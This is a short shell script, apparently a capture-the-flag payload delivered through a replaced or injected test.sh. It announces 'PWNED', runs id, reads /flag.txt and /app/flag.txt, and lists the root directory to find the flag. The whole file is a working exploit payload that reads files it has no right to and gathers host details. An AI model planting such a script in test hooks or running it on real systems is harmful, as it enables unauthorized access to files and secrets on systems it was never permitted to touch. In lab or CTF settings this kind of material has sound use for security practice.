#!/bin/sh
echo "=== PWNED via test.sh ==="
id
echo "--- /flag.txt ---"
cat /flag.txt 2>&1
echo "--- búsqueda alterna ---"
cat /app/flag.txt 2>/dev/null; ls -la / 2>/dev/null | head
